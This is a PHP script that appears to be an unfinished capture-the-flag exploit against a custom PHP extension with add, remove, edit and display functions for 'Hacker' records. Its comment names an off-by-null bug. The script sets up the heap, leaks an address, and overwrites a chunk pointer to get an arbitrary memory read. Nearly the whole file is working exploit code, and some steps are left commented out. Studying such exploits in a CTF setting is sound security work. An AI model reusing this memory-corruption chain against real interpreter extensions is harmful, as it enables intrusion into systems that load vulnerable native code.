<?php

function Substring($string, $start, $length = null) {
    $result = "";
    for ($i = $start; ($length === null || $i - $start < $length); $i++) {
        $result .= $string[$i];
    }
    return $result;
}
function u64($byteArray) {
    $integerValue = 0;
    for ($i = 7; $i >= 0; $i--) {
        $byteValue = ord($byteArray[$i]);
        $shift = ((7 - (7-$i) ) * 8);
        $integerValue += ($byteValue << $shift);
    }
    return $integerValue;
}

/* function repeat($character, $count) { */
/*     $result = ""; */
/**/
/*     for ($i = 0; $i < $count; $i++) { */
/*         $result .= $character; */
/*     } */
/**/
/*     return $result; */
/* } */

/* 思路 off by null */

/* $payload = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"; /*0x20*/
$payload = "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb"; /*0x20*/
addHacker("aaaaaaaaaaaaaaaa", $payload);
$res = displayHacker(0);
$leak = u64( Substring($res, 0x10, 6) );
echo ($leak);
echo "\n";

removeHacker(0);

addHacker($payload, $payload);
addHacker($payload, $payload);
addHacker($payload, $payload);
addHacker($payload, $payload);
removeHacker(0);

addHacker("\x00\x01\x02\x03\x04\x05\x06\x07\x30\x00\x00\x00\x00\x00\x00\x00\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1A\x1B\x1C\x1D\x1E\x1F\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2A\x2B\x2C\x2D\x2E\x2F\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3A\x3B\x3C\x3D\x3E\x3F", "0\x000\x000\x000\x000\x000\x000\x000\x000\x000\x000\x000\x000\x000\x000\x000\x000\x000\x000\x000\x000\x000\x000\x000\x000\x000\x000\x000\x000\x000\x000\x000\x00");


/* editHacker(0, pack("P", $chunk_list)); */
/* addHacker($payload, $payload); */
/* editHacker(2, "\xef\xbf\xad\xde\x00"); */
$res = displayHacker(0);
echo ($res);

editHacker(0, pack("P", (0x8+ ($leak & 0x7fffffffff00) )));
$res = displayHacker(2);
$leak = u64( $res );
echo ($leak);
echo "\n";
echo ($res);
echo "\n";

$res = displayHacker(2);
/* echo ($res); */

?>
